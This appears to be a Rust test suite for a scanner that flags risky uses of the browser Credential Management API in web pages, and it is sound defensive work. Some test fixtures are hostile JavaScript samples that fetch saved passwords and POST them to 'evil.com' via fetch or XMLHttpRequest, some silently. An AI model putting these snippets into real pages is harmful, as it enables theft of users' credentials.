use crate::credential_api_audit::*;

#[test]
fn no_credential_api_no_issues() {
    assert!(analyze_credential_api("<html></html>").is_empty());
}

#[test]
fn detects_get() {
    let body = r#"<script>navigator.credentials.get({password: true})</script>"#;
    let issues = analyze_credential_api(body);
    assert!(issues.contains(&CredentialApiIssue::GetDetected));
}

#[test]
fn detects_store() {
    let body = r#"<script>navigator.credentials.store(cred)</script>"#;
    let issues = analyze_credential_api(body);
    assert!(issues.contains(&CredentialApiIssue::StoreDetected));
}

#[test]
fn detects_create() {
    let body = r#"<script>navigator.credentials.create({publicKey: opts})</script>"#;
    let issues = analyze_credential_api(body);
    assert!(issues.contains(&CredentialApiIssue::CreateDetected));
}

#[test]
fn detects_mediation_silent() {
    let body = r#"<script>navigator.credentials.get({mediation: "silent"})</script>"#;
    let issues = analyze_credential_api(body);
    assert!(issues.contains(&CredentialApiIssue::MediationSilent));
}

#[test]
fn detects_mediation_silent_single_quotes() {
    let body = r#"<script>navigator.credentials.get({mediation: 'silent'})</script>"#;
    let issues = analyze_credential_api(body);
    assert!(issues.contains(&CredentialApiIssue::MediationSilent));
}

#[test]
fn no_mediation_silent_without_marker() {
    let body = r#"<script>navigator.credentials.get({password: true})</script>"#;
    let issues = analyze_credential_api(body);
    assert!(!issues.contains(&CredentialApiIssue::MediationSilent));
}

#[test]
fn detects_password_credential() {
    let body = r#"<script>new PasswordCredential({id: "u", password: "p"})</script>"#;
    let issues = analyze_credential_api(body);
    assert!(issues.contains(&CredentialApiIssue::PasswordCredential));
}

#[test]
fn detects_federated_credential() {
    let body =
        r#"<script>new FederatedCredential({id: "u", provider: "https://idp.com"})</script>"#;
    let issues = analyze_credential_api(body);
    assert!(issues.contains(&CredentialApiIssue::FederatedCredential));
}

#[test]
fn detects_no_prevent_silent_access() {
    let body = r#"<script>navigator.credentials.get({password: true})</script>"#;
    let issues = analyze_credential_api(body);
    assert!(issues.contains(&CredentialApiIssue::NoPreventSilentAccess));
}

#[test]
fn no_prevent_issue_when_present() {
    let body = r#"<script>
        navigator.credentials.get({password: true});
        navigator.credentials.preventSilentAccess();
    </script>"#;
    let issues = analyze_credential_api(body);
    assert!(!issues.contains(&CredentialApiIssue::NoPreventSilentAccess));
}

#[test]
fn severity_silent_highest() {
    assert_eq!(
        credential_api_severity(&CredentialApiIssue::MediationSilent),
        6.5
    );
}

#[test]
fn severity_get_lowest() {
    assert_eq!(
        credential_api_severity(&CredentialApiIssue::GetDetected),
        3.5
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        CredentialApiIssue::GetDetected,
        CredentialApiIssue::MediationSilent,
    ];
    let mut seq = 0;
    let ops = credential_api_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(CredentialApiIssue::GetDetected.to_string(), "get_detected");
    assert_eq!(
        CredentialApiIssue::StoreDetected.to_string(),
        "store_detected"
    );
    assert_eq!(
        CredentialApiIssue::CreateDetected.to_string(),
        "create_detected"
    );
    assert_eq!(
        CredentialApiIssue::MediationSilent.to_string(),
        "mediation_silent"
    );
    assert_eq!(
        CredentialApiIssue::NoPreventSilentAccess.to_string(),
        "no_prevent_silent_access"
    );
    assert_eq!(
        CredentialApiIssue::FederatedCredential.to_string(),
        "federated_credential"
    );
    assert_eq!(
        CredentialApiIssue::PasswordCredential.to_string(),
        "password_credential"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_credential_api("").is_empty());
}

#[test]
fn security_no_credential_api_no_issues() {
    assert!(analyze_credential_api_security("<html></html>").is_empty());
}

#[test]
fn security_empty_body_no_issues() {
    assert!(analyze_credential_api_security("").is_empty());
}

#[test]
fn security_no_api_keywords_no_issues() {
    let body = r#"<script>console.log("hello");</script>"#;
    assert!(analyze_credential_api_security(body).is_empty());
}

#[test]
fn detects_credential_phishing() {
    let body = r#"<script>
        const cred = new PasswordCredential({id: "user", password: "pass"});
        navigator.credentials.store(cred);
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::CredentialPhishing));
}

#[test]
fn no_credential_phishing_without_store() {
    let body = r#"<script>
        const cred = new PasswordCredential({id: "user", password: "pass"});
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(!issues.contains(&CredentialApiSecurityIssue::CredentialPhishing));
}

#[test]
fn detects_credential_exfiltration_with_fetch() {
    let body = r#"<script>
        navigator.credentials.get({password: true}).then(cred => {
            fetch("https://evil.com", {method: "POST", body: JSON.stringify(cred)});
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::CredentialExfiltration));
}

#[test]
fn detects_credential_exfiltration_with_xhr() {
    let body = r#"<script>
        navigator.credentials.get({password: true}).then(cred => {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "https://evil.com");
            xhr.send(JSON.stringify(cred));
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::CredentialExfiltration));
}

#[test]
fn no_credential_exfiltration_without_network() {
    let body = r#"<script>
        navigator.credentials.get({password: true}).then(cred => {
            console.log(cred);
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(!issues.contains(&CredentialApiSecurityIssue::CredentialExfiltration));
}

#[test]
fn detects_credential_without_user_gesture() {
    let body = r#"<script>
        window.addEventListener("load", () => {
            navigator.credentials.get({password: true});
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::CredentialWithoutUserGesture));
}

#[test]
fn no_credential_without_user_gesture_when_click_present() {
    let body = r#"<script>
        document.getElementById("login").addEventListener("click", () => {
            navigator.credentials.get({password: true});
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(!issues.contains(&CredentialApiSecurityIssue::CredentialWithoutUserGesture));
}

#[test]
fn no_credential_without_user_gesture_when_keydown_present() {
    let body = r#"<script>
        document.addEventListener("keydown", () => {
            navigator.credentials.store(cred);
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(!issues.contains(&CredentialApiSecurityIssue::CredentialWithoutUserGesture));
}

#[test]
fn no_credential_without_user_gesture_when_pointerdown_present() {
    let body = r#"<script>
        element.addEventListener("pointerdown", () => {
            navigator.credentials.create({publicKey: opts});
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(!issues.contains(&CredentialApiSecurityIssue::CredentialWithoutUserGesture));
}

#[test]
fn detects_credential_cross_origin() {
    let body = r#"<script>
        navigator.credentials.get({password: true}).then(cred => {
            parent.postMessage({credential: cred}, "*");
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::CredentialCrossOrigin));
}

#[test]
fn no_credential_cross_origin_without_postmessage() {
    let body = r#"<script>
        navigator.credentials.get({password: true}).then(cred => {
            localStorage.setItem("credential", JSON.stringify(cred));
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(!issues.contains(&CredentialApiSecurityIssue::CredentialCrossOrigin));
}

#[test]
fn detects_silent_credential_access_double_quotes() {
    let body = r#"<script>
        navigator.credentials.get({mediation: "silent"});
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::SilentCredentialAccess));
}

#[test]
fn detects_silent_credential_access_single_quotes() {
    let body = r#"<script>
        navigator.credentials.get({mediation: 'silent'});
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::SilentCredentialAccess));
}

#[test]
fn no_silent_credential_access_without_silent() {
    let body = r#"<script>
        navigator.credentials.get({mediation: "optional"});
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(!issues.contains(&CredentialApiSecurityIssue::SilentCredentialAccess));
}

#[test]
fn detects_credential_persistent_tracking() {
    let body = r#"<script>
        navigator.credentials.get({password: true}).then(cred => {
            trackUser(cred.id);
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::CredentialPersistentTracking));
}

#[test]
fn no_credential_persistent_tracking_without_id_access() {
    let body = r#"<script>
        navigator.credentials.get({password: true}).then(cred => {
            console.log(cred);
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(!issues.contains(&CredentialApiSecurityIssue::CredentialPersistentTracking));
}

#[test]
fn detects_federated_credential_abuse_with_provider() {
    let body = r#"<script>
        const cred = new FederatedCredential({
            id: "user@example.com",
            provider: "https://idp.example.com"
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::FederatedCredentialAbuse));
}

#[test]
fn detects_federated_credential_abuse_with_protocol() {
    let body = r#"<script>
        const cred = new FederatedCredential({
            id: "user",
            protocol: "oauth2"
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::FederatedCredentialAbuse));
}

#[test]
fn no_federated_credential_abuse_without_markers() {
    let body = r#"<script>
        const cred = new FederatedCredential({id: "user"});
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(!issues.contains(&CredentialApiSecurityIssue::FederatedCredentialAbuse));
}

#[test]
fn detects_credential_enumeration_with_for_loop() {
    let body = r#"<script>
        for (let i = 0; i < users.length; i++) {
            navigator.credentials.get({password: true, id: users[i]});
        }
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::CredentialEnumeration));
}

#[test]
fn detects_credential_enumeration_with_foreach() {
    let body = r#"<script>
        users.forEach(user => {
            navigator.credentials.get({password: true, id: user});
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::CredentialEnumeration));
}

#[test]
fn no_credential_enumeration_without_iteration() {
    let body = r#"<script>
        navigator.credentials.get({password: true});
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(!issues.contains(&CredentialApiSecurityIssue::CredentialEnumeration));
}

#[test]
fn detects_credential_in_background() {
    let body = r#"<script>
        document.addEventListener("visibilitychange", () => {
            if (document.hidden) {
                navigator.credentials.get({password: true});
            }
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::CredentialInBackground));
}

#[test]
fn no_credential_in_background_without_visibility_event() {
    let body = r#"<script>
        navigator.credentials.get({password: true});
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(!issues.contains(&CredentialApiSecurityIssue::CredentialInBackground));
}

#[test]
fn detects_weak_credential_storage() {
    let body = r#"<script>
        const cred = new PasswordCredential({id: "user", password: "pass"});
        localStorage.setItem("cred", JSON.stringify(cred));
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.contains(&CredentialApiSecurityIssue::WeakCredentialStorage));
}

#[test]
fn no_weak_credential_storage_with_encryption() {
    let body = r#"<script>
        const cred = new PasswordCredential({id: "user", password: "pass"});
        const encrypted = await crypto.subtle.encrypt(algorithm, key, data);
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(!issues.contains(&CredentialApiSecurityIssue::WeakCredentialStorage));
}

#[test]
fn no_weak_credential_storage_with_encrypt_keyword() {
    let body = r#"<script>
        const cred = new PasswordCredential({id: "user", password: "pass"});
        const encrypted = encrypt(cred);
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(!issues.contains(&CredentialApiSecurityIssue::WeakCredentialStorage));
}

#[test]
fn security_display_variants() {
    assert_eq!(
        CredentialApiSecurityIssue::CredentialPhishing.to_string(),
        "credential_phishing"
    );
    assert_eq!(
        CredentialApiSecurityIssue::CredentialExfiltration.to_string(),
        "credential_exfiltration"
    );
    assert_eq!(
        CredentialApiSecurityIssue::CredentialWithoutUserGesture.to_string(),
        "credential_without_user_gesture"
    );
    assert_eq!(
        CredentialApiSecurityIssue::CredentialCrossOrigin.to_string(),
        "credential_cross_origin"
    );
    assert_eq!(
        CredentialApiSecurityIssue::SilentCredentialAccess.to_string(),
        "silent_credential_access"
    );
    assert_eq!(
        CredentialApiSecurityIssue::CredentialPersistentTracking.to_string(),
        "credential_persistent_tracking"
    );
    assert_eq!(
        CredentialApiSecurityIssue::FederatedCredentialAbuse.to_string(),
        "federated_credential_abuse"
    );
    assert_eq!(
        CredentialApiSecurityIssue::CredentialEnumeration.to_string(),
        "credential_enumeration"
    );
    assert_eq!(
        CredentialApiSecurityIssue::CredentialInBackground.to_string(),
        "credential_in_background"
    );
    assert_eq!(
        CredentialApiSecurityIssue::WeakCredentialStorage.to_string(),
        "weak_credential_storage"
    );
}

#[test]
fn security_severity_phishing_highest() {
    assert_eq!(
        credential_api_security_severity(&CredentialApiSecurityIssue::CredentialPhishing),
        9.0
    );
}

#[test]
fn security_severity_exfiltration_high() {
    assert_eq!(
        credential_api_security_severity(&CredentialApiSecurityIssue::CredentialExfiltration),
        8.5
    );
}

#[test]
fn security_severity_background_lowest() {
    assert_eq!(
        credential_api_security_severity(&CredentialApiSecurityIssue::CredentialInBackground),
        4.0
    );
}

#[test]
fn security_severity_weak_storage_low() {
    assert_eq!(
        credential_api_security_severity(&CredentialApiSecurityIssue::WeakCredentialStorage),
        4.5
    );
}

#[test]
fn security_severity_range_valid() {
    let variants = vec![
        CredentialApiSecurityIssue::CredentialPhishing,
        CredentialApiSecurityIssue::CredentialExfiltration,
        CredentialApiSecurityIssue::SilentCredentialAccess,
        CredentialApiSecurityIssue::CredentialCrossOrigin,
        CredentialApiSecurityIssue::FederatedCredentialAbuse,
        CredentialApiSecurityIssue::CredentialWithoutUserGesture,
        CredentialApiSecurityIssue::CredentialEnumeration,
        CredentialApiSecurityIssue::CredentialPersistentTracking,
        CredentialApiSecurityIssue::WeakCredentialStorage,
        CredentialApiSecurityIssue::CredentialInBackground,
    ];
    for variant in variants {
        let severity = credential_api_security_severity(&variant);
        assert!(severity >= 3.0 && severity <= 9.0);
    }
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        CredentialApiSecurityIssue::CredentialPhishing,
        CredentialApiSecurityIssue::CredentialExfiltration,
    ];
    let mut seq = 0;
    let ops = credential_api_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn security_to_operations_empty_input() {
    let issues = vec![];
    let mut seq = 0;
    let ops = credential_api_security_to_operations(&issues, &mut seq);
    assert!(ops.is_empty());
    assert_eq!(seq, 0);
}

#[test]
fn security_multiple_issues_detected() {
    let body = r#"<script>
        const cred = new PasswordCredential({id: "user", password: "pass"});
        navigator.credentials.store(cred);
        navigator.credentials.get({mediation: "silent"}).then(c => {
            fetch("https://evil.com", {method: "POST", body: JSON.stringify(c)});
        });
    </script>"#;
    let issues = analyze_credential_api_security(body);
    assert!(issues.len() >= 3);
    assert!(issues.contains(&CredentialApiSecurityIssue::CredentialPhishing));
    assert!(issues.contains(&CredentialApiSecurityIssue::CredentialExfiltration));
    assert!(issues.contains(&CredentialApiSecurityIssue::SilentCredentialAccess));
}
